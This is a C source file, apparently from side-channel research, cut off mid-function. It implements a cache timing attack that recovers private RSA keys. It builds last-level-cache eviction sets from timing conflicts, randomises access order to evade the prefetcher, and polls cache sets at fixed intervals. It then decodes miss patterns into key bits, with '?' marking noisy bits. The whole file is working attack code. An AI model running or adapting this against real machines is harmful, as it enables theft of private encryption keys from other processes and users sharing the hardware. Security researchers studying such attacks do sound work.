#include "EvictionSet.h"
#include "CacheFuncs.h"

#include <time.h>
#include <string.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <math.h>



int firstTry = 1;
int NUMBER_OF_KEYS_TO_SAMPLE = 100;

//#define PRINTF printf
#define PRINTF(bla...)

char* RsaKeys[NUMBER_OF_DIFFERENT_KEYS];

#if KEYS_LEN_IN_BITS == 4096
int PATTERN_LEN = 7;
//#define MAX_WRONG_ZEROS 1
//#define MAX_WRONG_ONES  1
int MAX_WRONG_ZEROS = 1;
int MAX_WRONG_ONES = 1;
#define MAX_SAMPLES_PER_BIT 9
#else
int PATTERN_LEN = 6;
#define MAX_WRONG_ZEROS 1
#define MAX_WRONG_ONES  1
#define MAX_SAMPLES_PER_BIT 8
#endif

#define BITS_IN_CHUNK 16
#define MAX_MISSING_BITS 300
#define MAX_WRONG_BITS_IN_CHUNK 2

#define BAD_BIT 0xa

LinesBuffer TestBuffer;

/**
 * To make sure the pre-fetcher can't learn our cache usage, we randomize the order in which
 * we access lines in a set.
 */
void RandomizeRawSet(Raw_Cache_Set* pSet);

/**
 * Same thing but for a smaller set.
 *
 * TODO: merge these 2 functions, no real reason to have double of these.
 */
void RandomizeSet(Cache_Set* pSet);

/**
 * Gets a list of lines, and a line that conflicts with them.
 *
 * Goes over the list and searches for the exact subset that causes the conflict.
 * Then returns it in the pSmallSet pointer.
 * Returns the number of lines in said set.
 */
int FindSet(Raw_Cache_Set* pBigSet, Cache_Set* pSmallSet, char* pConflictingLine);

/**
 * Returns the number of set a certain address is associated with
 */
int AdressToSet(char* Adress);

/**
 * Sorts a set of statistics in a Cache_Statistics struct.
 *
 * Returns the sorted list in the StatisticsToSort pointer.
 */
void SortStatistics(Cache_Statistics* BaseStatistics, Cache_Statistics* StatisticsToSort);

/**
 * Takes a string representing a hex number, and returns a newly allocated
 * buffer with the data translated to binary.
 */
char* StringToBuff(char* String);

char* PrepareReversedList(char* pSet, int SetSize);

/**
 * This is basically a mem_cmp function, written for debug purposes.
 * It returns at which byte did the first difference occur (+1 or -1,
 * depending on which buff had the larger char).
 */
int memcmp_dbg(char* pFirstBuff, char* pSecondBuff, int nBuffsLen) {
	int nCurrByte;
	for (nCurrByte = 0; nCurrByte < nBuffsLen; nCurrByte++) {
		if (pFirstBuff[nCurrByte] > pSecondBuff[nCurrByte]) {
			return nCurrByte + 1;
		} else if (pFirstBuff[nCurrByte] < pSecondBuff[nCurrByte]) {
			return -nCurrByte - 1;
		}
	}

	return 0;
}

int CreateEvictionSetFromBuff(LinesBuffer* pBuffer, Cache_Mapping* pEvictionSets)
{
	return CreateEvictionSetFromMem(pBuffer->Lines->Bytes, sizeof(LinesBuffer), pEvictionSets);
}

int CreateEvictionSetFromMem(char* Memory, uint32_t Size, Cache_Mapping* pCacheSets)
{
	int i, j;
	Raw_Cache_Mapping RawMapping;
	int FilledSetIndex = 0;
	int SetsInCurrModulu;
	int CurrSetInSlice;
	int FindSetAttempts;

	memset(pCacheSets, 0, sizeof(Cache_Mapping));
	memset(&RawMapping, 0, sizeof(RawMapping));

	// Go over all raw sets and split them to real sets.
	for (j = 0; j < RAW_SETS; j++)
	{
		for (i = j * BYTES_IN_LINE, SetsInCurrModulu = 0; i < Size && SetsInCurrModulu < SLICE_NUM; i += BYTES_IN_LINE * RAW_SETS)
		{
			// Get bit 1 of the slice.
			char* CurrAdress = Memory + i;
			int Set = AdressToSet(CurrAdress);
			int Miss = 0;

			// First of all, determine if this line belongs to a set we already found!
			for (CurrSetInSlice = FilledSetIndex - SetsInCurrModulu; CurrSetInSlice < FilledSetIndex; CurrSetInSlice++)
			{
				Miss = ProbeManyTimes(pCacheSets->Sets[CurrSetInSlice].Lines[0], pCacheSets->Sets[CurrSetInSlice].ValidLines, CurrAdress);

				// If the line conflicts with this set, give it up, we don't care about it no more
				if (Miss) break;
			}

			if (Miss) continue;

			// Now go over all the relevant sets and check
			RandomizeRawSet(&RawMapping.Sets[Set]);
			Miss = ProbeManyTimes(RawMapping.Sets[Set].Lines[0], RawMapping.Sets[Set].ValidLines, CurrAdress);

			// If its a miss, there is no conflict, insert line into raw set.
			if (!Miss) {
				if (RawMapping.Sets[Set].ValidLines >= RAW_LINES_IN_SET)
				{
					break;
				}

				RawMapping.Sets[Set].Lines[RawMapping.Sets[Set].ValidLines] = CurrAdress;
				RawMapping.Sets[Set].ValidLines++;
			}
			// A miss means we conflict with a set. find the conflicting set!
			else
			{
				// We try and find the set a few times... mostly because at some point in the past
				// The function wasn't stable enough.
				for (FindSetAttempts = 0; FindSetAttempts < 3; FindSetAttempts++)
				{
					int FoundNewSet = FindSet(&RawMapping.Sets[Set], &pCacheSets->Sets[FilledSetIndex], CurrAdress);
					SetsInCurrModulu += FoundNewSet;
					FilledSetIndex += FoundNewSet;

					if (FoundNewSet && (FilledSetIndex%100==0))
					{
						printf("Found set %d\r\n\033[1A", FilledSetIndex);
						RandomizeSet(&pCacheSets->Sets[FilledSetIndex]);
						break;
					}
				}
			}
		}
	}

	pCacheSets->ValidSets = FilledSetIndex;
	return FilledSetIndex;
}

int AdressToSet(char* Adress)
{
	return (((uint64_t)Adress >> 6) & 0b11111111111);
}

void RandomizeRawSet(Raw_Cache_Set* pSet)
{
	int LineIdx;
	int* LinesInSet = malloc(sizeof(int) * pSet->ValidLines);

	if (pSet->ValidLines == 0)
		return;

	// At the start of the randomization process, every line points to the
	// next line in the array.
	for (LineIdx = 0; LineIdx < pSet->ValidLines - 1; LineIdx++)
	{
		LinesInSet[LineIdx] = LineIdx + 1;
	}

	int LinesLeft = pSet->ValidLines - 1;
	int CurrLine = 0;

	// Now go over the linked list and randomize it
	for (LineIdx = 0; LineIdx < pSet->ValidLines && LinesLeft > 0; LineIdx++)
	{
		int NewPos = rand() % LinesLeft;
		unsigned int RandomLine = LinesInSet[NewPos];
		LinesInSet[NewPos] = LinesInSet[LinesLeft - 1];
		LinesInSet[LinesLeft - 1] = 0;
		LinesLeft--;
		*((uint64_t*)pSet->Lines[CurrLine]) = ((uint64_t)pSet->Lines[RandomLine]);
		CurrLine = RandomLine;
	}

	*((uint64_t*)pSet->Lines[CurrLine]) = 0;

	free(LinesInSet);
}

void RandomizeSet(Cache_Set* pSet)
{
	int LineIdx;
	int* LinesInSet = malloc(sizeof(int) * pSet->ValidLines);

	if (pSet->ValidLines == 0){
		free(LinesInSet);
		return;
	}

	// At the start of the randomization process, every line points to the
	// next line in the array.
	for (LineIdx = 0; LineIdx < pSet->ValidLines - 1; LineIdx++)
	{
		LinesInSet[LineIdx] = LineIdx + 1;
	}

	int LinesLeft = pSet->ValidLines - 1;
	int CurrLine = 0;

	// Now go over the linked list and randomize it
	for (LineIdx = 0; LineIdx < pSet->ValidLines && LinesLeft > 0; LineIdx++)
	{
		int NewPos = rand() % LinesLeft;
		unsigned int RandomLine = LinesInSet[NewPos];
		LinesInSet[NewPos] = LinesInSet[LinesLeft - 1];
		LinesInSet[LinesLeft - 1] = 0;
		LinesLeft--;
		*((uint64_t*)pSet->Lines[CurrLine]) = ((uint64_t)pSet->Lines[RandomLine]);
		CurrLine = RandomLine;
	}

	*((uint64_t*)pSet->Lines[CurrLine]) = 0;

	free(LinesInSet);
}

/**
 * Sometimes, when looking for a new set, we find too many lines.
 * This function tries to get rid of the most unlikely lines and go down to 12.
 */
int DecreaseSetSize(Raw_Cache_Set* pSmallSet, char* pConflictingLine)
{
	int ConflictLineIndex;
	char* pLinesAnchor;
	int i;
	int Attempts = 5;

	while (pSmallSet->ValidLines > LINES_IN_SET && Attempts)
	{
		RandomizeRawSet(pSmallSet);
		pLinesAnchor = pSmallSet->Lines[0];
		char* pLinesCurrentEnd = pSmallSet->Lines[0];
		Attempts--;

		// Find the end of the set
		while (*(char**)pLinesCurrentEnd != 0)
		{
			pLinesCurrentEnd = *(char**)pLinesCurrentEnd;
		}

		// Find all the lines in the conflict set which are the same set as the target.
		for (ConflictLineIndex = 0; ConflictLineIndex < pSmallSet->ValidLines; ConflictLineIndex++)
		{
			char* pCurrLine = pLinesAnchor;

			if (pLinesAnchor == NULL)
			{
				break;
			}

			// Pop the first line out of the conflict set.
			pLinesAnchor = *((char**)pLinesAnchor);

			// If the line we removed conflicted with the new line, add the line to the set.
			if (!ProbeManyTimes(pLinesAnchor, pSmallSet->ValidLines - 1, pConflictingLine))
			{
				*((char**)pLinesCurrentEnd) = pCurrLine;
				pLinesCurrentEnd = pCurrLine;
			}
			// Line does not conflict, and is therefore not interesting, move it to non conflicting list.
			else
			{
				// Find the line in the small set and remove it.
				for (i = 0; i < pSmallSet->ValidLines; i++)
				{
					if (pSmallSet->Lines[i] == pCurrLine) {
						pSmallSet->Lines[i] = pSmallSet->Lines[pSmallSet->ValidLines - 1];
						pSmallSet->ValidLines --;
					}
				}

				if (pSmallSet->ValidLines <= LINES_IN_SET)
				{
					break;
				}
			}
		}
	}

	// Lets check wether these lines coincide
	if (pSmallSet->ValidLines == LINES_IN_SET)
	{
		RandomizeRawSet(pSmallSet);
		while (ProbeManyTimes(pSmallSet->Lines[0], pSmallSet->ValidLines, pConflictingLine))
		{
			return 1;
		}
	}

	return 0;
}

int FindSet(Raw_Cache_Set* pBigSet, Cache_Set* pSmallSet, char* pConflictingLine)
{
	char* pNewSetEnd 					= NULL;
	char* pNonConflictingAnchor 		= pBigSet->Lines[0];
	char* pLinesAnchor 					= pBigSet->Lines[0];
	char* pLinesCurrentEnd				= pBigSet->Lines[0];
	int ConflictLineIndex;
	int LineInEvictionSet 				= 0;
	int CurrentConflictSize 			= pBigSet->ValidLines;
	Raw_Cache_Set tmpSet;
	int SetFound						= 0;
	int BigSetIdx, SmallSetIdx;
	int WhileIdx = 0;
	int LinesToCheck;
	static int ElevenLinesSetsFound = 0;

	// Big set is the linked list with the potential lines for the set.
	// If its less then LINES_IN_SET there isn't really anything to do.
	if (pBigSet->Lines[0] == NULL || pBigSet->ValidLines < LINES_IN_SET)
		return 0;

	RandomizeRawSet(pBigSet);

	// Find the end of the set
	while (*(char**)pLinesCurrentEnd != 0)
	{
		pLinesCurrentEnd = *(char**)pLinesCurrentEnd;
	}

	// If we haven't found enough lines and not enough left to check, leave.
	if (pBigSet->ValidLines < 12)
	{
		return 0;
	}
	// If we have exactly 12 lines, then we already have the full set.
	else if (pBigSet->ValidLines == 12)
	{
		memcpy(&tmpSet, pBigSet, sizeof(tmpSet));
		LineInEvictionSet = 12;
	}
	// Many lines are available, need to extract the ones which belong to the set.
	else
	{
		// Due to noise we might not be able to filter all irrelevant lines on first try.
		// So keep trying!
		while (LineInEvictionSet < LINES_IN_SET)
		{
			LinesToCheck = pBigSet->ValidLines - LineInEvictionSet;
			WhileIdx++;

			// Remerge the 2 lists together, and try finding conflicting lines once more
			if (WhileIdx > 1)
			{
				*(char**)pNewSetEnd = pLinesAnchor;
				pLinesAnchor = pNonConflictingAnchor;
				CurrentConflictSize = pBigSet->ValidLines;
			}

			// Eh, if we tried 5 times and still haven't succeeded, just give up.
			// We don't want to work forever.
			if (WhileIdx > 5)
				break;

			pNewSetEnd = NULL;
			pNonConflictingAnchor = NULL;

			// Find all the lines in the conflict set which are the same set as the target.
			for (ConflictLineIndex = 0; ConflictLineIndex < LinesToCheck; ConflictLineIndex++)
			{
				char* pCurrLine = pLinesAnchor;

				if (pLinesAnchor == NULL)
				{
					break;
				}

				// Pop the first line out of the conflict set.
				pLinesAnchor = *((char**)pLinesAnchor);

				// If the line we removed conflicted with the new line, add the line to the set.
				if (!ProbeManyTimes(pLinesAnchor, CurrentConflictSize - 1, pConflictingLine))
				{
					tmpSet.Lines[LineInEvictionSet] = pCurrLine;
					*(char**)pCurrLine = 0;

					LineInEvictionSet++;
					*((char**)pLinesCurrentEnd) = pCurrLine;
					pLinesCurrentEnd = pCurrLine;
				}
				// Line does not conflict, and is therefore not interesting, move it to non conflicting list.
				else
				{
					if (pNewSetEnd == NULL)
						pNewSetEnd = pCurrLine;

					CurrentConflictSize--;
					*((char**)pCurrLine) = pNonConflictingAnchor;
					pNonConflictingAnchor = pCurrLine;
				}
			}
		}
	}

	// Lets check wether these lines conflict
	if (LineInEvictionSet >= LINES_IN_SET)			//Allow only 12 lines/set!!!!
	{
		tmpSet.ValidLines = LineInEvictionSet;
		RandomizeRawSet(&tmpSet);

		// Make sure the new set still conflicts with the line.
		if (ProbeManyTimes(tmpSet.Lines[0], tmpSet.ValidLines, pConflictingLine) &&
			ProbeManyTimes(tmpSet.Lines[0], tmpSet.ValidLines, pConflictingLine) &&
			ProbeManyTimes(tmpSet.Lines[0], tmpSet.ValidLines, pConflictingLine))
		{
			// If there are too many lines, keep trimming then down.
			if (LineInEvictionSet > LINES_IN_SET)
				SetFound = DecreaseSetSize(&tmpSet, pConflictingLine);
			else
				SetFound = 1;
		}

		// Yay, the set is valid, lets call it a day.
		if (SetFound)
		{
			if (LineInEvictionSet == 11)
			{
				ElevenLinesSetsFound++;
			}

			// Remove the lines in the new set from the list of potential lines.
			for (SmallSetIdx = 0; SmallSetIdx < tmpSet.ValidLines; SmallSetIdx++)
			{
				BigSetIdx = 0;
				pSmallSet->Lines[SmallSetIdx] = tmpSet.Lines[SmallSetIdx];

				while (BigSetIdx < pBigSet->ValidLines)
				{
					// if its the same line, remove it from the big set.
					if (pBigSet->Lines[BigSetIdx] == tmpSet.Lines[SmallSetIdx])
					{
						pBigSet->Lines[BigSetIdx] = pBigSet->Lines[pBigSet->ValidLines - 1];
						pBigSet->Lines[pBigSet->ValidLines - 1] = 0;
						pBigSet->ValidLines--;
						break;
					}

					BigSetIdx++;
				}
			}

			pSmallSet->ValidLines = tmpSet.ValidLines;

			return 1;
		} else {
			PRINTF("Bad set!\r\n");
		}
	} else
	{
		PRINTF("Not enough lines %d in set\r\n", LineInEvictionSet);
	}

	return 0;
}

void GetMemoryStatistics(Cache_Mapping* pEvictionSets, Cache_Statistics* pCacheStats)
{
	qword* pSetInterMissTimings[SETS_IN_CACHE];
	int pSetTimingsNum[SETS_IN_CACHE];
	int Set;
	int Sample;
	struct timespec start, end;
	qword TimeSpent;
	int Miss;
	clock_gettime(CLOCK_REALTIME, &start);

	// Go over all sets in the cache and generate their statistics.
	for (Set = 0; Set < SETS_IN_CACHE; Set++)
	{
		pSetInterMissTimings[Set] = malloc(sizeof(qword) * (CACHE_POLL_SAMPLES_PER_SET + 1));
		pSetInterMissTimings[Set][0] = 0;
		pSetTimingsNum[Set] = 1;
		Miss = 0;

		// Sample the sets a pre-determined amount of times.
		for (Sample = 1; Sample <= CACHE_POLL_SAMPLES_PER_SET; Sample++)
		{
			clock_gettime(CLOCK_REALTIME, &start);

			Miss = PollAsm(pEvictionSets->Sets[Set].Lines[0], pEvictionSets->Sets[Set].ValidLines);// pEvictionSets->Sets[Set].ValidLines - 1);

			// If we got a miss, add it to the statistics (do not need to add hits, since
			// all time slots were inited as hits by default.
			if (Miss)
			{
				pSetInterMissTimings[Set][pSetTimingsNum[Set]] = Sample;
				pSetTimingsNum[Set]++;
			}

			do {
				clock_gettime(CLOCK_REALTIME, &end);
				TimeSpent = (qword)(end.tv_nsec - start.tv_nsec) + (qword)(end.tv_sec - start.tv_sec) * 1000000000;
			} while (TimeSpent < CACHE_POLL_TIMEOUT_IN_NANO);

			PRINTF("Time probing cache: %ld ns, sleeping %ld ns.\n", elapsedTime, TimeSpent);
		}
	}

	printf("Parsing the data!\r\n");

	// Time to parse the data.
	for (Set = 0; Set < SETS_IN_CACHE; Set++)
	{
		double Mean = 0;
		double Var = 0;
		double Tmp;

		if (pSetTimingsNum[Set] <= 1)
			continue;

		Mean = pSetInterMissTimings[Set][pSetTimingsNum[Set] - 1];
		Mean /= (pSetTimingsNum[Set] - 1);
		pCacheStats->SetStats[Set].mean = Mean;
		pCacheStats->SetStats[Set].num = pSetTimingsNum[Set] - 1;
		pCacheStats->SetStats[Set].offset = (long int)(pEvictionSets->Sets[Set].Lines[0]) % (SETS_IN_SLICE * 64);

		// Calculate Mean and variance
		for (Sample = 1; Sample < pSetTimingsNum[Set]; Sample++)
		{
			Tmp = (pSetInterMissTimings[Set][Sample] - pSetInterMissTimings[Set][Sample - 1]) - Mean;
			Var += Tmp * Tmp;
		}

		Var /= (pSetTimingsNum[Set] - 1);
		pCacheStats->SetStats[Set].variance = Var;
	}

	for (Set = 0; Set < SETS_IN_CACHE; Set++)
	{
		free(pSetInterMissTimings[Set]);
	}
}

void WriteStatisticsToFile(Cache_Statistics* pCacheStats, char* pFileName, int Sorted)
{
	FILE* pFile;
	pFile = fopen(pFileName, "wr");
	int Set;
	char Stats[150];
	Cache_Statistics SortedStats;

	if (Sorted)
	{
		SortStatistics(pCacheStats, &SortedStats);
	}

	// Time to parse the data.
	for (Set = SETS_IN_CACHE - 1; Set >= 0 ; Set--)
	{
		unsigned int SetNum = (unsigned int)SortedStats.SetStats[Set].mean;
		sprintf(Stats, "Set %d, Num %ld, mean %lf, var %lf, offset %lx\r\n", SetNum, (long int)pCacheStats->SetStats[SetNum].num,
				pCacheStats->SetStats[SetNum].mean, pCacheStats->SetStats[SetNum].variance, pCacheStats->SetStats[SetNum].offset);
		fwrite(Stats, strlen(Stats), 1, pFile);
	}

	fclose(pFile);
}

void SortStatistics(Cache_Statistics* BaseStatistics, Cache_Statistics* StatisticsToSort)
{
	unsigned int FirstIdx, SecondIdx, Set, tmp;

	for (Set = 0; Set < SETS_IN_CACHE; Set++)
	{
		StatisticsToSort->SetStats[Set].num = BaseStatistics->SetStats[Set].num;
		StatisticsToSort->SetStats[Set].mean = Set;
	}

	for (FirstIdx = 0; FirstIdx < SETS_IN_CACHE; FirstIdx++)
	{
		for (SecondIdx = 0; SecondIdx + 1 < SETS_IN_CACHE - FirstIdx; SecondIdx++)
		{
			if (StatisticsToSort->SetStats[SecondIdx + 1].num < StatisticsToSort->SetStats[SecondIdx].num)
			{
				tmp = StatisticsToSort->SetStats[SecondIdx].num;
				StatisticsToSort->SetStats[SecondIdx].num = StatisticsToSort->SetStats[SecondIdx + 1].num;
				StatisticsToSort->SetStats[SecondIdx + 1].num = tmp;
				tmp = StatisticsToSort->SetStats[SecondIdx].mean;
				StatisticsToSort->SetStats[SecondIdx].mean = StatisticsToSort->SetStats[SecondIdx + 1].mean;
				StatisticsToSort->SetStats[SecondIdx + 1].mean = tmp;
			}
		}
	}
}


char* PrepareReversedList(char* pSet, int SetSize)
{
	int j;
	char* temp;
	char* pCurrLine = pSet;
	char* pCurrLine2 = pSet + sizeof(char*);

	for (j = 0; j < SetSize; j++)
	{
		temp = pCurrLine2;
		pCurrLine2 = pCurrLine + sizeof(char*);
		if(j < SetSize-1)
		{
			 pCurrLine = *(char**)pCurrLine;
		}
		if(j == 0)
		{
			*(char**)pCurrLine2 = 0;
		}
		else
		{
			*(char**)pCurrLine2 = temp;
		}
	}
	return pCurrLine2;
}

/**
 * This function polls the cache for samples of the set usage.
 *
 * Returns an allocated buffer with the requested samples.
 */
__always_inline char* PollForDataSamples(Cache_Set* pSet, uint64_t SamplesToRead)
{
	char* DataRead = malloc(sizeof(char) * SamplesToRead + 1);
	int Sample;
	struct timespec start, end;
	qword TimeSpent;
	int Miss;
	int setPtrIdx = 0;
	char *SetPtrs[2];
	SetPtrs[0] = pSet->Lines[0];
	SetPtrs[1] = PrepareReversedList(pSet->Lines[0], pSet->ValidLines);
	clock_gettime(CLOCK_REALTIME, &start);
	//FILE* samples=fopen("OneSample.txt","w");
	// Get the samples.
	for (Sample = 1; Sample <= SamplesToRead; Sample++)
	{
		clock_gettime(CLOCK_REALTIME, &start);
		setPtrIdx = (setPtrIdx + 1) % 2;
		Miss = PollAsm(SetPtrs[0], pSet->ValidLines);// pEvictionSets->Sets[Set].ValidLines - 1);
		//if(Sample<100000)fprintf(samples,"%d, ",Miss);
		//Miss += PollAsm(pSet->Lines[0], pSet->ValidLines);// pEvictionSets->Sets[Set].ValidLines - 1);

		DataRead[Sample] = (Miss > 0);

		// We want to make sure all samples are spread evenly, so we wait a little after the sample.
		// This is to reduce the effect of misses on the sample timings.
		do {
			clock_gettime(CLOCK_REALTIME, &end);
			TimeSpent = (qword)(end.tv_nsec - start.tv_nsec) + (qword)(end.tv_sec - start.tv_sec) * 1000000000;
		} while (TimeSpent < CACHE_POLL_TIMEOUT_IN_NANO - CACHE_POLL_TIME_SAMPLE_DELAY);

		PRINTF("Time probing cache: %ld ns, sleeping %ld ns.\n", elapsedTime, TimeSpent);
	}

	DataRead[Sample] = 0;

	return DataRead;
}

/**
 * Prints to a file a line.
 * Will only print up to 50000 chars.
 *
 * This function is usefull because many of our buffers are very large, and reading large files
 * takes alot of time when we don't really need all hundred of thousands of samples.
 */
void PrintInLines2(FILE* pFile, char* pString, int LineSize, int Init) {
	static int nCharInLine = 0;

	if (Init) {
		nCharInLine = 0;
	}

	if (nCharInLine > 50000) {
		return;
	}

	fprintf(pFile, "%s", pString);
	nCharInLine++;

	if (nCharInLine % LineSize == 0) {
		fprintf(pFile, "\r\n");
	}
}

/**
 * This is kind of an ugly code...
 * This helper function is just to make PrintInLines2 to start counting
 * chars from 0.
 *
 * There is probably a better way of doing this but hell.
 */
void PrintInLines(FILE* pFile, char* pString, int LineSize) {
	PrintInLines2(pFile, pString, LineSize, 0);
}

/**
 * Takes an array of samples and translates them into actual bits, according to given patterns.
 *
 * In more detail:
 * We search the samples for the OnesPattern and ZerosPattern.
 * If we find them, we substitute these bits for the matching bit.
 * If not, we put a '?' to denote there was too much noise and we failed to identify the bit.
 *
 * We also give an option to write to file for debug purposes, and return a score describing
 * how many patterns were found (For purposes of determining how good this set is for further
 * sampling).
 * We also return how many bits were found in the pFoundBits pointer.
 *
 * Returns a pointer to an allocated buffer containing the translated bits.
 */
char* SamplesToDataBitsArray(char* Samples, char OnesPattern[], char ZerosPattern[], int PatternBitsNum,
		int SamplesNum, int WriteToFile, char* pFileName, int* pScore, int* pFoundBitsNum, int FindPattern)
{
	int CurrSample = 0;
	int Score = 0;
	int bit, i;
	int WrongBits;
	int OnesFound = 0;
	int ZerosFound = 0;
	int ForwardSteps = 2;
	int Step;
	int MaxWrongBits = MAX_WRONG_ZEROS;
	int* ZerosIndexes = malloc(sizeof(int) * SamplesNum / PatternBitsNum);
	int* OnesIndexes = malloc(sizeof(int) * SamplesNum / PatternBitsNum);
	int CurrZero;
	FILE* pFile;
	int DataLen = SamplesNum / PatternBitsNum + 1;
	char* ReadData = malloc(DataLen);

	char* TmpSamples = malloc(SamplesNum + 1);
	memcpy(TmpSamples, Samples, SamplesNum);

	// Write to file the samples before we start analyzing them.
	if (WriteToFile)
	{
		for (i = 0; i < SamplesNum; i++)
		{
			TmpSamples[i] += '0';
		}

		TmpSamples[SamplesNum] = 0;
		// If too many samples to easily read, only print the first 50k
		if (SamplesNum > 50000)
			TmpSamples[50000] = 0;

		pFile = fopen(pFileName, "wr");
		fprintf(pFile, "Samples:\r\n");
		//fprintf(pFile, "%s\r\n", TmpSamples);

		int Line = 0;
		for (Line = 0; Line < strlen(TmpSamples); Line += 100)
		{
			fprintf(pFile, "%.100s\r\n", TmpSamples + Line);
		}
	}

	memcpy(TmpSamples, Samples, SamplesNum);

	int ConsecutiveZeroes = 0;
	int Interruptions = 0;

	// For starters, make sure we do not confuse non-encryption areas with encryption areas.
	while (CurrSample < SamplesNum)
	{
		// Find groups of continous zeroes
		if (*(TmpSamples + CurrSample) == 0)
		{
			ConsecutiveZeroes++;
		}
		else if (ConsecutiveZeroes != 0)
		{
			// Enough consecutive zeroes found, annialate them!
			if (Interruptions >= 1 && ConsecutiveZeroes >= PatternBitsNum * 2)
			{
				memset(TmpSamples + CurrSample - ConsecutiveZeroes - Interruptions, BAD_BIT, ConsecutiveZeroes);
			}

			// If we have more than 1 sample interrupting the arrival of 0 bits, start counting from scratch.
			if (Interruptions > 1)
			{
				ConsecutiveZeroes = 0;
				Interruptions = 0;
			} else
			{
				Interruptions++;
			}
		}

		CurrSample++;
	}

	// Enough consecutive zeroes found, annialate them!
	if (ConsecutiveZeroes >= PatternBitsNum * 2)
	{
		memset(TmpSamples + CurrSample - ConsecutiveZeroes - Interruptions, BAD_BIT, ConsecutiveZeroes);
	}

	CurrSample = 0;

	// First we will try and find all the zeroes
	while (CurrSample + PatternBitsNum < SamplesNum)
	{
		int BestResult = MaxWrongBits + 1;
		int BestStep = 0;

		for (Step = 0; Step <= ForwardSteps; Step++)
		{
			WrongBits = 0;

			// Check we aren't over the array bounds.
			if (CurrSample + PatternBitsNum + Step >= SamplesNum)
			{
				break;
			}

			// Compare the first n bits with the patterns
			for (bit = 0; bit < PatternBitsNum; bit++)
			{
				WrongBits += ((*(TmpSamples + CurrSample + bit + Step) != *(ZerosPattern + bit)) ? 1 : 0);
			}

			// If the result is decent, compare it with the next few bits to
			// see if we can get an even better pattern.
			if (WrongBits < BestResult)
			{
				BestResult = WrongBits;
				BestStep = Step;
			}
			// If the result is bad, just skip to the next bit
			else
			{
				break;
			}
		}

		// If we found a zero pattern, zero all relevant samples to make sure they aren't used later for 1's
		if (BestResult <= MaxWrongBits)
		{
			for (bit = 0; bit < PatternBitsNum; bit++)
			{
				*(TmpSamples + CurrSample + BestStep + bit) = 0xe;
			}

			ZerosIndexes[ZerosFound++] = CurrSample + BestStep;
			Score += (MaxWrongBits - BestResult) + 1;
			CurrSample += PatternBitsNum + BestStep;
		}
		else
		{
			CurrSample++;
		}
	}

	CurrSample = 0;
	ForwardSteps = 1;
	CurrZero = 0;
	MaxWrongBits = MAX_WRONG_ONES;

	// Now do the same for ones
	while (CurrSample + PatternBitsNum < SamplesNum)
	{
		int BestResult = MaxWrongBits + 1;
		int BestStep = 0;

		if (CurrZero < ZerosFound && CurrSample > ZerosIndexes[CurrZero])
			CurrZero++;

		if (CurrZero < ZerosFound && CurrSample == ZerosIndexes[CurrZero])
			CurrSample += PatternBitsNum;

		for (Step = 0; Step <= ForwardSteps; Step++)
		{
			WrongBits = 0;

			// Check we aren't over the array bounds.
			if (CurrSample + PatternBitsNum + PatternBitsNum + Step >= SamplesNum)
			{
				break;
			}

			// Compare the first n bits with the patterns
			for (bit = 0; bit < PatternBitsNum; bit++)
			{
				WrongBits += (*(TmpSamples + CurrSample + bit + Step) != *(OnesPattern + bit));
			}

			// If the result is decent, compare it with the next few bits to
			// see if we can get an even better pattern.
			if (WrongBits < BestResult)
			{
				BestResult = WrongBits;
				BestStep = Step;
			}
			// If the result is bad, just skip to the next bit
			else
			{
				break;
			}
		}

		// If we found a one pattern, zero all relevant samples to make sure they aren't used later for 1's
		if (BestResult <= MaxWrongBits)
		{
			for (bit = 0; bit < PatternBitsNum; bit++)
			{
				*(TmpSamples + CurrSample + BestStep + bit) = 0xf;
			}

			OnesIndexes[OnesFound++] = CurrSample + BestStep;
			Score += (MaxWrongBits - BestResult) + 1 + (MAX_WRONG_ZEROS - MAX_WRONG_ONES);
			CurrSample += PatternBitsNum + BestStep + 1;
		}
		else
		{
			CurrSample++;
		}
	}

	// If we found way more zeroes then ones or the other way round, this probably isn't a real key.
	// Give this set a 0 score.
	if (OnesFound > ZerosFound * 4 ||
		ZerosFound > OnesFound * 4)
		Score = 0;

	// Only give a score if one was requested
	if (pScore != NULL)
		*pScore = Score;

	int CurrOnesIdx = 0;
	int CurrZeroIdx = 0;
	int LastIndex = -1;
	int LastBitEnd = 0;
	int BadBitsNum = 0;

	if (WriteToFile) {
		fprintf(pFile, "Indexes:\r\n");
		PrintInLines2(pFile, "\r\n", 100, 1);
	}

	// We now have a list of indexes to where in the samples we have found zeros and ones.
	// Now go over the samples and find in which areas we found neither a one nor a zero,
	// and mark that area as a '?' to note we missed a bit.
	while (CurrOnesIdx < OnesFound && CurrZeroIdx < ZerosFound)
	{
		// Check where was the last bit we identified.
		if (ZerosIndexes[CurrZeroIdx] < OnesIndexes[CurrOnesIdx])
		{
			LastIndex = ZerosIndexes[CurrZeroIdx];

			if (WriteToFile) {
				i = 0;
				while (LastBitEnd + i < LastIndex)
				{
					PrintInLines(pFile, " ", 100);
					i++;
				}
			}

			// If the difference between the last identified bit and the new one is longer then the pattern size, fill with '?'s
			while (LastBitEnd + PatternBitsNum + 2 < LastIndex)
			{

				ReadData[CurrOnesIdx + CurrZeroIdx + BadBitsNum] = '?';
				BadBitsNum++;
				LastBitEnd += PatternBitsNum + 1;
			}

			LastBitEnd = LastIndex + PatternBitsNum;
			ReadData[CurrOnesIdx + CurrZeroIdx + BadBitsNum] = '0';

			if (WriteToFile) {
				for (i = 0; i < PatternBitsNum; i++)
				{
					PrintInLines(pFile, "0", 100);
				}
			}

			CurrZeroIdx++;
		} else
		{
			LastIndex = OnesIndexes[CurrOnesIdx];

			if (WriteToFile) {
				i = 0;
				while (LastBitEnd + i < LastIndex)
				{
					PrintInLines(pFile, " ", 100);
					i++;
				}
			}

			// If the difference between the last identified bit and the new one is longer then the pattern size, fill with '?'s
			while (LastBitEnd + PatternBitsNum + 2 < LastIndex)
			{

				ReadData[CurrOnesIdx + CurrZeroIdx + BadBitsNum] = '?';
				BadBitsNum++;
				LastBitEnd += PatternBitsNum + 1;
			}

			LastBitEnd = LastIndex + PatternBitsNum;
			ReadData[CurrOnesIdx + CurrZeroIdx + BadBitsNum] = '1';

			if (WriteToFile) {
				for (i = 0; i < PatternBitsNum; i++)
				{
					PrintInLines(pFile, "1", 100);
				}
			}

			CurrOnesIdx++;
		}
	}

	// Either we finished going over the ones or zeros, so fill the rest of the bits accordingly.
	while (CurrOnesIdx < OnesFound)
	{
		LastIndex = OnesIndexes[CurrOnesIdx];

		// If the difference between the last identified bit and the new one is longer then the pattern size, fill with '?'s
